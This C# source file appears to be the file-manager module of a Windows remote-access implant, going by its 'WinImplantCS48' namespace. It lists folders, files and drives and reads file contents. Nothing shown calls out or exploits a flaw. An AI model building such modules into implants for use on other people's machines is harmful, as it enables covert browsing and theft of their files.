using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinImplantCS48
{
    public class clsfnFileMgr
    {
        public string m_szInitFileDir { get; set; }

        public struct stFileInfo
        {
            public bool bIsDir { get; set; }
            public string szFilePath { get; set; }
            public string szPermission { get; set; }
            public long nFileSize { get; set; }
            public string szCreationDate { get; set; }
            public string szLastModified { get; set; }
            public string szLastAccessed { get; set; }
        }

        public clsfnFileMgr()
        {
            m_szInitFileDir = Application.StartupPath;
        }

        public List<stFileInfo> fnScandir(string szDirPath)
        {
            List<stFileInfo> lsDir = new List<stFileInfo>();
            List<stFileInfo> lsFile = new List<stFileInfo>();

            foreach (string szDir in Directory.GetDirectories(szDirPath))
            {
                DirectoryInfo info = new DirectoryInfo(szDir);
                lsDir.Add(new stFileInfo()
                {
                    bIsDir = true,
                    szFilePath = info.FullName,
                    nFileSize = 0,
                    szPermission = "X",
                    szCreationDate = info.CreationTime.ToString("F"),
                    szLastModified = info.LastWriteTime.ToString("F"),
                    szLastAccessed = info.LastAccessTime.ToString("F"),
                });
            }

            foreach (string szFileName in Directory.GetFiles(szDirPath))
            {
                FileInfo info = new FileInfo(szFileName);
                FileAttributes attr = File.GetAttributes(szFileName);
                bool bIsReadOnly = (attr & FileAttributes.ReadOnly) == FileAttributes.ReadOnly;

                lsFile.Add(new stFileInfo()
                {
                    bIsDir = false,
                    szFilePath = info.FullName,
                    nFileSize = info.Length,
                    szPermission = bIsReadOnly ? "R" : "RW",
                    szCreationDate = info.CreationTime.ToString("F"),
                    szLastModified = info.LastWriteTime.ToString("F"),
                    szLastAccessed = info.LastAccessTime.ToString("F"),
                });
            }

            List<stFileInfo> lsResult = new List<stFileInfo>();
            lsResult.AddRange(lsDir);
            lsResult.AddRange(lsFile);

            return lsResult;
        }

        public List<string> fnlsGetDrives()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            return drives.Select(x => x.Name.Replace("\\", string.Empty)).ToList();
        }

        public (int nCode, string szContent) fnReadFile(string szFilePath)
        {
            try
            {
                return (1, File.ReadAllText(szFilePath));
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }
    }
}
